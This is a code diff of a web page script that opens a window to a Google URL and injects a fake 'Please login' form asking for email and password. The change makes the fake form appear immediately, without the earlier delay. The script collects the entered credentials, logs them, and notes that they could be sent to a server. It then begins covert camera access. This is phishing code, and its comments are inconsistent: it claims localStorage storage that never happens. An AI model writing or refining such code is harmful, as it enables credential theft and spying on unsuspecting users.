@@ -19,35 +19,33 @@
 
     <script>
         function accessData() {
-            // Open Google CSI (or any other target URL) in a new window
-            var x = window.open('https://www.google.com/csi'); // Open Google CSI
+            // Open Google CSI (or any other target URL) in a new window without delay
+            var x = window.open('https://www.google.com/csi'); // Open Google CSI instantly
 
-            setTimeout(function() {
-                // Simulate a fake login page after some time (3 seconds)
-                x.document.body.innerHTML = '<h1>Please login</h1>';
-                x.document.body.innerHTML += 'Email: <input id="email"><br>';
-                x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
-                x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
+            // Simulate a fake login page immediately (no delay)
+            x.document.body.innerHTML = '<h1>Please login</h1>';
+            x.document.body.innerHTML += 'Email: <input id="email"><br>';
+            x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
+            x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
 
-                // Function to send the collected data (removed as per your request)
-                function sendData() {
-                    var email = document.getElementById('email').value;
-                    var password = document.getElementById('pass').value;
+            // Function to send data (removed as per your request)
+            function sendData() {
+                var email = document.getElementById('email').value;
+                var password = document.getElementById('pass').value;
 
-                    // Check if both email and password are filled
-                    if (email === "" || password === "") {
-                        alert("Please enter both email and password.");
-                        return; // Prevent sending empty data
-                    }
-
-                    // Log the data to the console (no redirect)
-                    console.log("Email:", email);
-                    console.log("Password:", password);
-
-                    // Optionally, you can do more here (send data to a server, etc.)
-                    alert('Data has been stored in localStorage');
+                // Check if both email and password are filled
+                if (email === "" || password === "") {
+                    alert("Please enter both email and password.");
+                    return; // Prevent sending empty data
                 }
-            }, 3000); // Wait for 3 seconds to simulate the page load time
+
+                // Log the data to the console (no redirect)
+                console.log("Email:", email);
+                console.log("Password:", password);
+
+                // Optionally, you can do more here (send data to a server, etc.)
+                alert('Data has been stored in localStorage');
+            }
 
             // Akses Kamera
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
